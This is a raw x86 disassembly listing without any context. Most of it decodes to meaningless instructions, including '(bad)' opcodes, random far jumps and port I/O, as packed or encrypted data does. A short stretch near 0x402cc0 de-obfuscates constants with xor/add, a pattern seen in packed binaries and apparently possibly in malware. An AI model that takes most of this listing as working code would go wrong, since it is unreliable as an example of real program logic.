  40293a:	xor    BYTE PTR [edi+edi*4-0x72],dl
  40293e:	mov    ebp,0x1f9b36b5
  402943:	jb     0x402927
  402945:	cmp    ah,BYTE PTR [edx-0x78a792f7]
  40294b:	loope  0x4028db
  40294d:	ret    0xc8f1
  402950:	repz cmp dl,0xa2
  402954:	dec    edi
  402955:	add    eax,0x14f85da6
  40295a:	mov    eax,ds:0x1d85e879
  40295f:	ret    
  402960:	or     al,0x2
  402962:	push   eax
  402963:	mov    bl,0xff
  402965:	adc    al,0x19
  402967:	fldcw  WORD PTR [edi]
  402969:	jmp    0x6c01:0xff5b0e24
  402970:	ds out 0xc0,eax
  402973:	xlat   BYTE PTR ds:[ebx]
  402974:	push   ss
  402975:	call   0x9c26615d
  40297a:	ja     0x402906
  40297c:	jns    0x402902
  40297e:	mov    esp,0x121bf284
  402983:	sub    al,0x68
  402985:	pop    ecx
  402986:	lods   al,BYTE PTR ds:[esi]
  402987:	sub    bh,BYTE PTR [edi-0x4a]
  40298a:	out    0x95,al
  40298c:	outs   dx,DWORD PTR ds:[esi]
  40298d:	push   ebx
  40298e:	sahf   
  40298f:	pop    ss
  402990:	xor    edi,DWORD PTR [edi]
  402992:	pop    ss
  402993:	cwde   
  402994:	sar    DWORD PTR [edx+0x5],cl
  402997:	data16 arpl WORD PTR [eax-0x39fd8ba7],bp
  40299e:	in     al,dx
  40299f:	les    ebx,FWORD PTR [ebx]
  4029a1:	popa   
  4029a2:	jmp    0x402a08
  4029a4:	xor    BYTE PTR [eax+eax*8+0x36a97c59],bh
  4029ab:	enter  0xba15,0x85
  4029af:	out    0x6c,eax
  4029b1:	cmp    DWORD PTR [edi+0x5112668d],0xffffffe0
  4029b8:	cmove  ebx,DWORD PTR [esi+0x95f3b32]
  4029bf:	in     al,0x70
  4029c1:	and    DWORD PTR fs:[edi+0x20df2a9f],esp
  4029c8:	mov    esi,0xb3707822
  4029cd:	sub    BYTE PTR ds:0x5625abde,al
  4029d3:	test   al,0x68
  4029d5:	jmp    0xca75:0xda933a72
  4029dc:	outs   dx,DWORD PTR ds:[esi]
  4029dd:	mov    ch,0x75
  4029df:	and    dl,dl
  4029e1:	stc    
  4029e2:	leave  
  4029e3:	jo     0x402a2a
  4029e5:	xchg   ebp,eax
  4029e6:	jle    0x4029b9
  4029e8:	mov    ?,edx
  4029ea:	ret    
  4029eb:	push   ss
  4029ec:	mov    ebp,0x6325ad95
  4029f1:	add    dh,BYTE PTR [ebx-0x3e32cfda]
  4029f7:	fnstsw WORD PTR [ebp-0x76bd64f6]
  4029fd:	add    ecx,esi
  4029ff:	pop    ss
  402a00:	imul   edi,DWORD PTR [eax+0x28f673f9],0x40
  402a07:	mov    esp,DWORD PTR [edi]
  402a09:	fmul   st,st(0)
  402a0b:	pushf  
  402a0c:	sub    esi,ebp
  402a0e:	adc    al,0x52
  402a10:	ja     0x402a10
  402a12:	jge    0x4029a2
  402a14:	or     eax,0x519dfabc
  402a19:	inc    edx
  402a1a:	es in  al,dx
  402a1c:	pusha  
  402a1d:	pop    ecx
  402a1e:	and    eax,0x826da0a1
  402a23:	aaa    
  402a24:	stos   DWORD PTR es:[edi],eax
  402a25:	inc    edi
  402a26:	sbb    ecx,eax
  402a28:	ins    DWORD PTR es:[edi],dx
  402a29:	and    al,0xd5
  402a2b:	jmp    0x402a98
  402a2d:	dec    ecx
  402a2e:	sar    DWORD PTR [edi],0x2e
  402a31:	dec    ebp
  402a32:	and    dl,BYTE PTR [ecx-0x35]
  402a35:	mov    ss,WORD PTR [ecx-0x2f6723fc]
  402a3b:	inc    esi
  402a3c:	clc    
  402a3d:	popf   
  402a3e:	pop    edi
  402a3f:	mov    al,BYTE PTR [edi+0x134b1d70]
  402a45:	pop    es
  402a46:	xor    eax,0xbb5481ca
  402a4b:	jo     0x402a7c
  402a4d:	and    al,0xdf
  402a4f:	out    dx,eax
  402a50:	popa   
  402a51:	push   ecx
  402a52:	pop    ebx
  402a53:	pop    edx
  402a54:	imul   ebp,DWORD PTR [ebp+0x56d821e0],0x44
  402a5b:	pop    ss
  402a5c:	sti    
  402a5d:	push   ebp
  402a5e:	jmp    0xdc7b:0xf18b043a
  402a65:	sub    eax,0x60a0c99
  402a6a:	jns    0x402ab2
  402a6c:	clc    
  402a6d:	fstp   QWORD PTR [ebx+eiz*1-0x61]
  402a71:	adc    BYTE PTR [edx+eiz*8-0x73d4ce0d],al
  402a78:	fdiv   QWORD PTR [esi+0x58]
  402a7b:	ficomp WORD PTR [ecx-0x80]
  402a7e:	xlat   BYTE PTR ds:[ebx]
  402a7f:	cmp    al,0xb4
  402a81:	in     eax,dx
  402a82:	inc    edx
  402a83:	leave  
  402a84:	pop    eax
  402a85:	jae    0x402a9d
  402a87:	test   eax,0xd6f1b5a1
  402a8c:	add    eax,0x58c1daf0
  402a91:	inc    esp
  402a92:	or     eax,0xf4fe4bcf
  402a97:	sbb    BYTE PTR [edi],dh
  402a99:	sbb    eax,0x61171d3b
  402a9e:	pop    DWORD PTR [esi-0x5f]
  402aa1:	pop    ds
  402aa2:	inc    eax
  402aa3:	xor    DWORD PTR [esi+ecx*2+0x52051d0e],ebp
  402aaa:	(bad)  
  402aab:	enter  0xf7bd,0x1a
  402aaf:	inc    ebx
  402ab0:	fild   QWORD PTR [esi]
  402ab2:	sahf   
  402ab3:	xchg   esi,eax
  402ab4:	sub    ecx,DWORD PTR [edx-0x21]
  402ab7:	adc    al,BYTE PTR [ebp+0x34015f02]
  402abd:	mov    ch,0x5a
  402abf:	test   eax,0x196827c3
  402ac4:	sahf   
  402ac5:	mov    edx,0x1f3d2118
  402aca:	addr16 out 0x51,al
  402acd:	(bad)  
  402ace:	gs iret 
  402ad0:	pop    edx
  402ad1:	lahf   
  402ad2:	and    ecx,esp
  402ad4:	jnp    0x402b40
  402ad6:	adc    edx,DWORD PTR [esi+0x3a]
  402ad9:	mov    ?,WORD PTR [esi+0xa]
  402adc:	rcl    BYTE PTR [ebx+eax*8+0x4812c24a],cl
  402ae3:	adc    ch,BYTE PTR [esi]
  402ae5:	ins    DWORD PTR es:[edi],dx
  402ae6:	test   bh,al
  402ae8:	syscall 
  402aea:	adc    cl,bl
  402aec:	imul   edi,DWORD PTR [edx+edi*2+0x33],0x29
  402af1:	jecxz  0x402b71
  402af3:	sti    
  402af4:	fadd   QWORD PTR ds:0x8174e24f
  402afa:	cmp    esp,esi
  402afc:	or     eax,0x60c77ba7
  402b01:	das    
  402b02:	(bad)  
  402b03:	(bad)  
  402b04:	jg     0x402b26
  402b06:	mov    bl,0x5
  402b08:	ds fmul st(5),st
  402b0b:	mov    al,0xb4
  402b0d:	jl     0x402b2a
  402b0f:	push   ebp
  402b10:	and    BYTE PTR [edi-0x30],0x9
  402b14:	and    DWORD PTR [ebp+0x2c520cda],ebx
  402b1a:	jp     0x402b22
  402b1c:	out    dx,al
  402b1d:	mov    al,0xb6
  402b1f:	dec    ebp
  402b20:	in     al,0x17
  402b22:	jmp    0xe4892529
  402b27:	aad    0x7e
  402b29:	not    ebp
  402b2b:	addps  xmm1,xmm6
  402b2e:	inc    ebp
  402b2f:	retf   
  402b30:	adc    eax,0x820745a9
  402b35:	add    eax,DWORD PTR [ecx+0x30]
  402b38:	add    al,0xa4
  402b3a:	xchg   ecx,eax
  402b3b:	out    dx,eax
  402b3c:	dec    ecx
  402b3e:	mov    ds:0x92982646,al
  402b43:	imul   esp,edx,0x15
  402b46:	mov    eax,edx
  402b48:	mov    esp,0x11e265b6
  402b4d:	cmp    eax,DWORD PTR [eax+0x6b]
  402b50:	icebp  
  402b51:	daa    
  402b52:	cs push ss
  402b54:	and    eax,0xca7481
  402b59:	jo     0x402b51
  402b5b:	xor    BYTE PTR [ecx+0x23],cl
  402b5e:	or     al,0x8a
  402b60:	test   BYTE PTR [ebx-0xd],0xa2
  402b64:	mov    ds:0xd23ed9f5,al
  402b69:	inc    edx
  402b6a:	daa    
  402b6b:	loope  0x402b1f
  402b6d:	pop    eax
  402b6e:	mov    ebx,eax
  402b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b71:	(bad)  
  402b72:	pop    ss
  402b73:	(bad)  
  402b75:	mov    esi,gs
  402b77:	into   
  402b78:	sbb    DWORD PTR [edi-0x3be95bef],ecx
  402b7e:	test   edx,edx
  402b80:	popf   
  402b81:	jmp    FWORD PTR [esi-0xc]
  402b84:	jnp    0x402b3f
  402b86:	xor    al,0xaf
  402b88:	popa   
  402b89:	mov    eax,ds:0xf5387b37
  402b8e:	inc    eax
  402b8f:	dec    eax
  402b90:	repnz ins DWORD PTR es:[edi],dx
  402b92:	call   0x73443d4a
  402b97:	mov    bh,0x91
  402b99:	(bad)  
  402b9a:	xchg   ebp,eax
  402b9b:	mov    dh,0xc3
  402b9d:	fsub   DWORD PTR [ecx-0x7c]
  402ba0:	jp     0x402b8a
  402ba2:	popa   
  402ba3:	and    cl,BYTE PTR [ecx]
  402ba5:	jecxz  0x402b7b
  402ba7:	jmp    0x2b5182ac
  402bac:	add    esi,ebp
  402bae:	pop    ebp
  402baf:	daa    
  402bb0:	cdq    
  402bb1:	fimul  DWORD PTR [edx+0x4b]
  402bb4:	dec    eax
  402bb5:	pop    ebx
  402bb6:	mov    bh,0xd4
  402bb8:	push   edi
  402bb9:	add    al,BYTE PTR [edx-0x4c]
  402bbc:	xchg   BYTE PTR [esi-0x7fa1b423],ch
  402bc2:	shl    BYTE PTR [edx*4-0x55ad0017],1
  402bc9:	sbb    al,0x34
  402bcb:	dec    edi
  402bcc:	fcom   DWORD PTR [ebx]
  402bce:	mov    esp,ebx
  402bd0:	test   DWORD PTR [eax+0x5f],esp
  402bd3:	ds dec eax
  402bd5:	jl     0x402bb2
  402bd7:	pop    ss
  402bd8:	icebp  
  402bd9:	push   eax
  402bda:	push   ebp
  402bdb:	sub    DWORD PTR [eax],ebp
  402bdd:	xlat   BYTE PTR ds:[ebx]
  402bde:	push   ss
  402bdf:	add    al,0x33
  402be1:	arpl   cx,ax
  402be3:	sar    BYTE PTR [ebp+0x7081f042],0x71
  402bea:	loope  0x402b7f
  402bec:	imul   ebp,ebx,0xd96de1c5
  402bf2:	aam    0x45
  402bf4:	mov    ds:0xab7354ea,eax
  402bf9:	pop    ebx
  402bfa:	add    dl,ch
  402bfc:	push   esi
  402bfd:	fnstsw WORD PTR [ecx+0x1e]
  402c00:	fild   DWORD PTR [bx+si]
  402c03:	push   cs
  402c04:	adc    bh,bh
  402c06:	sbb    DWORD PTR [esi+0x2029a413],ebx
  402c0c:	dec    esp
  402c0d:	daa    
  402c0e:	adc    DWORD PTR [edx],ebx
  402c10:	pop    eax
  402c11:	ret    0xd481
  402c14:	or     ch,BYTE PTR [eax-0x14]
  402c17:	xor    eax,0x28ab3fb
  402c1c:	in     eax,dx
  402c1d:	(bad)  [eax-0x67]
  402c20:	sub    esp,esp
  402c22:	push   edx
  402c23:	dec    ebp
  402c24:	add    al,0x4a
  402c26:	test   BYTE PTR [esi],ah
  402c28:	inc    edi
  402c29:	lods   al,BYTE PTR ds:[esi]
  402c2a:	jne    0x402c39
  402c2c:	ja     0x402c22
  402c2e:	mov    dh,0x91
  402c30:	sbb    DWORD PTR [edi],edi
  402c32:	nop
  402c33:	retf   0xf344
  402c36:	popa   
  402c37:	iret   
  402c38:	adc    ah,BYTE PTR [edx+0x1f]
  402c3b:	sbb    esi,DWORD PTR [edi+0x1e]
  402c3e:	mov    dh,BYTE PTR [ebp+0x3d]
  402c41:	shl    BYTE PTR gs:[esi-0x5e737cd4],1
  402c48:	jae    0x402c8e
  402c4a:	stos   DWORD PTR es:[edi],eax
  402c4b:	pop    eax
  402c4c:	or     ah,BYTE PTR [edx-0x68a997b4]
  402c52:	retf   
  402c53:	popa   
  402c54:	xchg   DWORD PTR [edi],esp
  402c56:	jge    0x402cb7
  402c58:	adc    esi,DWORD PTR [ebp+0x4683adbd]
  402c5e:	pop    ds
  402c5f:	dec    eax
  402c60:	ret    0xf8ab
  402c63:	add    al,0x8e
  402c65:	jle    0x402c92
  402c67:	jecxz  0x402c61
  402c69:	sbb    eax,0xde991ce6
  402c6e:	sub    DWORD PTR [ecx+0x4a],ebp
  402c71:	dec    ebp
  402c72:	mov    ecx,0x828530fc
  402c77:	scas   al,BYTE PTR es:[edi]
  402c78:	jno    0x402c42
  402c7a:	enter  0xe088,0x3c
  402c7e:	sub    ebx,ebp
  402c80:	imul   edi,DWORD PTR [bx-0x585c],0x88996c2d
  402c89:	lods   eax,DWORD PTR ds:[esi]
  402c8a:	setnp  ah
  402c8d:	bound  edi,QWORD PTR [ebx-0x7bd64575]
  402c93:	mov    dl,0x2f
  402c95:	push   ds
  402c96:	lea    esi,[ebp-0x7425726d]
  402c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c9d:	push   cs
  402c9e:	imul   eax,DWORD PTR [edi-0x55234c1f],0x106a3e77
  402ca8:	add    ch,BYTE PTR [eax+0x1bf9fde2]
  402cae:	push   ds
  402caf:	pop    eax
  402cb1:	or     DWORD PTR [ebx-0x60],ebp
  402cb4:	mov    ecx,0x6c0dc2a0
  402cb9:	lods   al,BYTE PTR ds:[esi]
  402cba:	jmp    0x28e811b2
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	xor    BYTE PTR fs:[esi],bl
  402d40:	mov    gs,WORD PTR [edx-0x68]
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402da8
  402d4b:	mov    dl,0x53
  402d4d:	mov    DWORD PTR [ebx+0x515ccc27],0x9ada0751
  402d57:	dec    ecx
  402d58:	pop    ebx
  402d59:	aas    
  402d5a:	jp     0x402d0c
  402d5c:	ret    0xefe8
  402d5f:	lea    ecx,[ebx]
  402d61:	xchg   DWORD PTR [esi+ebp*2-0x10],esi
  402d65:	ins    DWORD PTR es:[edi],dx
  402d66:	rol    BYTE PTR [ecx+0x54d96fdc],0xa5
  402d6d:	stos   DWORD PTR es:[edi],eax
  402d6e:	pop    edx
  402d6f:	jge    0x402db6
  402d71:	das    
  402d72:	add    BYTE PTR [edi-0x44a00fae],ah
  402d78:	sub    BYTE PTR [ebx-0x50],dl
  402d7b:	test   eax,0xa0c0bfd
  402d80:	aad    0xbb
  402d82:	sbb    esi,0xab638e6f
  402d88:	ins    DWORD PTR es:[edi],dx
  402d89:	mov    bl,0x72
  402d8b:	pusha  
  402d8c:	or     eax,0x4bbe62bb
  402d91:	jo     0x402d36
  402d93:	jg     0x402dea
  402d95:	dec    eax
  402d96:	stos   BYTE PTR es:[edi],al
  402d97:	sub    al,0xad
  402d99:	ja     0x402dbd
  402d9b:	dec    eax
  402d9c:	xchg   edi,eax
  402d9d:	addr16 dec esp
  402d9f:	pop    ebp
  402da0:	push   0x9e0bd7ed
  402da5:	pop    es
  402da6:	fdivrp st(1),st
  402da8:	sub    dh,dh
  402daa:	xor    dl,ah
  402dac:	pop    ebx
  402dad:	xchg   BYTE PTR [edi+0x64],bl
  402db0:	fcmovne st,st(6)
  402db2:	xor    esi,DWORD PTR [edi]
  402db4:	sub    al,BYTE PTR [edi-0xc]
  402db7:	and    al,dh
  402db9:	fcomp  DWORD PTR [ecx-0x5a]
  402dbc:	push   ebx
  402dbd:	inc    ch
  402dbf:	xor    eax,DWORD PTR [ebx+0x6b]
  402dc2:	add    ch,BYTE PTR [ecx-0x20]
  402dc5:	pop    esp
  402dc6:	sub    al,0xdb
  402dc8:	mov    eax,0x5262d0d2
  402dcd:	pushf  
  402dce:	adc    eax,0x370754c6
  402dd3:	xchg   ecx,eax
  402dd4:	jbe    0x402e50
  402dd6:	pop    ebp
  402dd7:	popa   
  402dd8:	inc    ecx
  402dd9:	mov    ch,0xc5
  402ddb:	(bad)  
  402ddc:	push   cs
  402ddd:	(bad)  
  402dde:	cmp    esp,eax
  402de0:	cmp    al,0x29
  402de2:	mov    ebx,DWORD PTR [esi-0x280cf256]
  402de8:	repnz push edi
  402dea:	test   DWORD PTR [ebx],edx
  402dec:	dec    esi
  402ded:	(bad)  
  402dee:	ss repnz (bad) 
  402df1:	pop    es
  402df2:	cld    
  402df3:	add    bl,dh
  402df5:	shl    DWORD PTR [edx+edi*2-0x7e],1
  402df9:	pusha  
  402dfa:	and    BYTE PTR [ecx+edx*4],dh
  402dfd:	pop    ecx
  402dfe:	mov    WORD PTR [edi],fs
  402e00:	mov    cl,0xdd
  402e02:	jno    0x402e83
  402e04:	int    0x17
  402e06:	retf   0x40fe
  402e09:	sub    DWORD PTR [edx+0x4a9d844],esp
  402e0f:	add    al,0xcc
  402e11:	out    dx,eax
  402e12:	js     0x402e8c
  402e14:	daa    
  402e15:	aaa    
  402e16:	and    al,0xbb
  402e18:	adc    eax,0xca1cb999
  402e1d:	repnz push esi
  402e1f:	sbb    al,0x91
  402e21:	push   0x7c
  402e23:	adc    eax,0x6afc496c
  402e28:	(bad)  
  402e29:	adc    al,0x3b
  402e2b:	(bad)  
  402e2c:	pop    ds
  402e2d:	mov    eax,0x777d6d13
  402e32:	mov    ebx,0x87f031a3
  402e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e38:	pusha  
  402e39:	adc    ebx,DWORD PTR [edx+0x19cb9901]
  402e3f:	setg   BYTE PTR [esp+ecx*1]
  402e43:	sahf   
  402e44:	push   es
  402e45:	and    eax,0x3c595536
  402e4a:	mul    BYTE PTR [ebp+0x27]
  402e4d:	jo     0x402e9b
  402e4f:	jnp    0x402e83
  402e51:	shr    DWORD PTR [edi],0x6
  402e54:	inc    edi
  402e55:	push   ebx
  402e56:	leave  
  402e57:	aas    
  402e58:	(bad)  
  402e59:	jnp    0x402e83
  402e5b:	jno    0x402df8
  402e5d:	retf   0xafc1
  402e60:	xchg   esi,eax
  402e61:	push   eax
  402e62:	scas   al,BYTE PTR es:[edi]
  402e63:	shl    DWORD PTR [ecx+0x5f],cl
  402e66:	pop    ds
  402e67:	nop
  402e68:	imul   esi,DWORD PTR [esi+0x6cbf1fa1],0x9f594685
  402e72:	retf   
  402e73:	jp     0x402e14
  402e75:	out    dx,eax
  402e76:	mov    esi,ebp
  402e78:	test   eax,0x50a409e9
  402e7d:	icebp  
  402e7e:	sub    dl,BYTE PTR [ecx+0x68]
  402e81:	call   0x166adb6f
  402e86:	jmp    0x9957:0xcab482d9
  402e8d:	xor    BYTE PTR [esi-0x7097e424],0xb7
  402e94:	push   ss
  402e95:	bound  edi,QWORD PTR [ecx+ebx*8-0x62ae9ee]
  402e9c:	xor    ebx,DWORD PTR [ecx+0x11]
  402e9f:	fwait
  402ea0:	xor    ah,BYTE PTR [ebp-0x63]
  402ea3:	jecxz  0x402e72
  402ea5:	xchg   edx,eax
  402ea6:	stos   BYTE PTR es:[edi],al
  402ea7:	mov    ebx,0x449fabc
  402eac:	out    0x44,eax
  402eae:	inc    eax
  402eaf:	adc    eax,0x6a3c25e7
  402eb4:	jecxz  0x402f22
  402eb6:	inc    esp
  402eb7:	les    ecx,FWORD PTR ds:[ebp-0x48]
  402ebb:	lea    esi,[ecx+0x703f86e2]
  402ec1:	jge    0x402f1f
  402ec3:	daa    
  402ec4:	ror    esp,1
  402ec6:	pushfw 
  402ec8:	or     BYTE PTR [ebp-0xbd4977f],bh
  402ece:	pop    edx
  402ecf:	emms   
  402ed1:	les    ecx,FWORD PTR [ebp+0x31a6d42]
  402ed7:	stc    
  402ed8:	push   edx
  402ed9:	es call 0x3b184d4a
  402edf:	fisubr DWORD PTR ds:0xd0237fff
  402ee5:	pop    eax
  402ee6:	ss popa 
  402ee8:	pop    ebp
  402ee9:	sbb    eax,0xaf9a8a72
  402eee:	sbb    edx,ebx
  402ef0:	lds    ecx,FWORD PTR [edx]
  402ef2:	outs   dx,DWORD PTR ds:[esi]
  402ef3:	mov    al,ds:0x8dca3c6f
  402ef8:	adc    bh,ah
  402efa:	mov    eax,0x5b868bcf
  402eff:	sar    BYTE PTR [eax-0xd],1
  402f02:	cmp    al,0xf0
  402f04:	int    0xfb
  402f06:	hlt    
  402f07:	cmp    BYTE PTR [esi-0x168dcf84],0x7b
  402f0e:	lea    edx,[esp+esi*1-0x3d]
  402f12:	cmp    edi,esp
  402f14:	and    DWORD PTR [esi],0x5b
  402f17:	mov    ds:0x82bf30ab,al
  402f1c:	fst    DWORD PTR [edi]
  402f1e:	jne    0x402ebf
  402f20:	pop    ebx
  402f21:	inc    edi
  402f22:	outs   dx,BYTE PTR ds:[esi]
  402f23:	mov    ebp,0x2b7aac4
  402f28:	and    DWORD PTR [edi+0x25f8b4a9],esp
  402f2e:	test   eax,0x8f7c5764
  402f33:	mov    ecx,0x10fb0cf5
  402f38:	xor    BYTE PTR [ecx+0x14],al
  402f3b:	retf   0xa739
  402f3e:	sbb    eax,eax
  402f40:	imul   esp,DWORD PTR [edi+0x71],0xfffb1a8c
  402f47:	jb     0x402f22
  402f49:	xor    BYTE PTR [ebp+0x16],dl
  402f4c:	mov    dl,0x63
  402f4e:	sbb    DWORD PTR [edi],eax
  402f50:	add    al,0x62
  402f52:	inc    eax
  402f53:	push   0xffffffe6
  402f55:	mov    gs,WORD PTR [eax]
  402f57:	mov    bh,cl
  402f59:	or     ch,ch
  402f5b:	fs stos DWORD PTR es:[edi],eax
  402f5d:	mov    eax,0xc9afa293
  402f62:	lods   eax,DWORD PTR ds:[esi]
  402f63:	sub    eax,0x4ad74df5
  402f68:	or     BYTE PTR [eax],0x51
  402f6b:	mov    ebp,?
  402f6d:	xor    eax,0xbe9a3e8a
  402f72:	mov    WORD PTR [ebp-0x1b3a9aa9],cs
  402f78:	add    eax,0x2c9f4436
  402f7d:	sar    DWORD PTR ds:0xc70d05d4,cl
  402f83:	push   0x14
  402f85:	hlt    
  402f86:	jns    0x402f7e
  402f88:	push   ecx
  402f89:	test   eax,0xa14f7e0f
  402f8e:	push   ss
  402f8f:	jmp    0x7480:0x50c2742
  402f96:	(bad)  
  402f97:	mov    esi,edi
  402f99:	mov    eax,0xd52068f2
  402f9e:	xchg   DWORD PTR [ecx-0x74],ebp
  402fa1:	xor    esi,DWORD PTR [ebp+0x37]
  402fa4:	test   eax,0x45e328aa
  402fa9:	sbb    dh,BYTE PTR [ebp+0x102aaa41]
  402faf:	daa    
  402fb0:	and    BYTE PTR [edi],dh
  402fb2:	inc    ebx
  402fb3:	ins    BYTE PTR es:[edi],dx
  402fb4:	scas   eax,DWORD PTR es:[edi]
  402fb5:	xchg   dl,dl
  402fb7:	adc    dh,bl
  402fb9:	arpl   WORD PTR [ebp+0x35],bp
  402fbc:	cmp    BYTE PTR [eax-0x4f],bh
  402fbf:	aad    0x10
  402fc1:	cmp    eax,0xa69faa97
  402fc6:	rcl    dh,0x77
  402fc9:	xchg   BYTE PTR [ebx-0x4e],cl
  402fcc:	pop    DWORD PTR [ecx]
  402fce:	in     al,0x9
  402fd0:	ins    BYTE PTR es:[edi],dx
  402fd1:	inc    ebp
  402fd2:	jle    0x402fe0
  402fd4:	pop    esp
  402fd5:	pop    edx
  402fd6:	sbb    al,0x6c
  402fd8:	or     al,0x4d
  402fda:	in     al,dx
  402fdb:	clc    
  402fdc:	mov    DWORD PTR [esi+edx*8+0x478974c3],eax
  402fe3:	fwait
  402fe4:	xchg   ebp,eax
  402fe5:	rcr    DWORD PTR [edi+edi*2+0x65f88b9d],0xd4
  402fed:	jbe    0x402fa4
  402fef:	adc    ch,dh
  402ff1:	in     eax,dx
  402ff2:	inc    eax
  402ff3:	mov    ds:0x714f8b88,eax
  402ff8:	pop    edx
  402ff9:	leave  
  402ffa:	inc    ecx
  402ffb:	jae    0x402f90
  402ffd:	popa   
  402ffe:	pop    ds
  402fff:	out    dx,al
  403000:	mov    al,ds:0x8956bbfd
  403005:	jbe    0x40305c
  403007:	jb     0x403028
  403009:	es dec esi
  40300b:	or     ebx,0x7e0f11fe
  403011:	shl    DWORD PTR [edx+ebp*4-0x16],0x4a
  403016:	pushf  
  403017:	and    ebp,DWORD PTR ds:0xc57a54fa
  40301d:	pushf  
  40301e:	mov    ch,0xbd
  403020:	repnz push ds
  403022:	and    al,0x57
  403024:	inc    edi
  403025:	lods   al,BYTE PTR ds:[esi]
  403026:	xchg   edx,eax
  403027:	xchg   esi,eax
  403028:	inc    eax
  403029:	mov    edx,0x8de87cef
  40302e:	push   es
  40302f:	outs   dx,DWORD PTR ds:[esi]
  403030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403031:	mov    ecx,0x2de52f06
  403036:	lock shl BYTE PTR [edi+ebp*4+0x4f],cl
  40303b:	pop    eax
  40303c:	push   eax
  40303d:	push   0x45bc6497
  403042:	mov    BYTE PTR [ecx-0x6e],dl
  403045:	lahf   
  403046:	sub    dh,ah
  403048:	xchg   edi,eax
  403049:	sti    
  40304a:	icebp  
  40304b:	jae    0x4030bd
  40304d:	push   edi
  40304e:	jne    0x4030a2
  403050:	test   BYTE PTR [ecx+eiz*2+0x2b],ah
  403054:	mov    ah,0xb4
  403056:	jmp    0x2d76:0x1310929f
  40305d:	jns    0x403093
  40305f:	jecxz  0x40303f
  403061:	inc    eax
  403062:	jmp    0x6a5aaf1c
  403067:	sbb    ch,0x7
  40306a:	mov    eax,ds:0xe7aea45f
  40306f:	jno    0x403052
  403071:	out    dx,eax
  403072:	in     eax,dx
  403073:	(bad)  
  403074:	dec    ebx
  403075:	push   ecx
  403076:	imul   ebx,DWORD PTR [ebx],0x528fe0a3
  40307c:	mul    DWORD PTR [eax+0x3e5cf01a]
  403082:	fcomp  QWORD PTR [edi-0x60c593a2]
  403088:	mov    dl,0xd9
  40308a:	sahf   
  40308b:	pop    eax
  40308c:	lods   al,BYTE PTR ds:[esi]
  40308d:	aad    0x70
  40308f:	mov    eax,ds:0xa13447c5
  403094:	not    edx
  403096:	dec    esp
  403097:	scas   al,BYTE PTR es:[edi]
  403098:	dec    ecx
  40309a:	push   0xe8825a0a
  40309f:	cmc    
  4030a0:	jp     0x4030ae
  4030a2:	lock call 0x6f66:0xfdd40a77
  4030aa:	jnp    0x403123
  4030ac:	not    ebp
  4030ae:	fst    QWORD PTR [ebx]
  4030b0:	ins    DWORD PTR es:[edi],dx
  4030b1:	inc    edx
  4030b2:	sub    eax,0x1f20ce5
  4030b7:	xchg   ebx,eax
  4030b8:	fs ja  0x4030b9
  4030bb:	cmp    BYTE PTR [esi-0x1f327dc6],ch
  4030c1:	loope  0x4030d3
  4030c3:	mov    al,ds:0xcb53631
  4030c8:	ror    BYTE PTR [edi+0xe4652b],0x8f
  4030cf:	adc    ebx,DWORD PTR [ebp-0x6b]
  4030d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030d3:	test   ebp,0x3425c06
  4030d9:	inc    ebx
  4030da:	mov    esi,0x661234cc
  4030df:	test   BYTE PTR [eax-0x3ff94d3f],bl
  4030e5:	sbb    eax,0x3a44ca08
  4030ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030eb:	dec    DWORD PTR [ecx-0x551527f8]
  4030f1:	ins    BYTE PTR es:[edi],dx
  4030f2:	ins    DWORD PTR es:[edi],dx
  4030f3:	cld    
  4030f4:	dec    eax
  4030f5:	fwait
  4030f6:	mov    edi,0x4fc0bcc5
  4030fb:	(bad)  
  4030fc:	xchg   ebx,eax
  4030fd:	xor    DWORD PTR [ecx+0x4c77298a],esp
  403103:	scas   eax,DWORD PTR es:[edi]
  403104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403105:	dec    edi
  403106:	mov    ecx,0x223929f1
  40310b:	pop    edx
  40310c:	test   eax,0xf025af16
  403111:	ret    
  403112:	mov    cl,0xf2
  403114:	xchg   al,dh
  403116:	push   ebp
  403117:	add    BYTE PTR [esp+eax*2-0x6b],bh
  40311b:	jns    0x403105
  40311d:	cmp    esp,DWORD PTR [eax+esi*8+0x78]
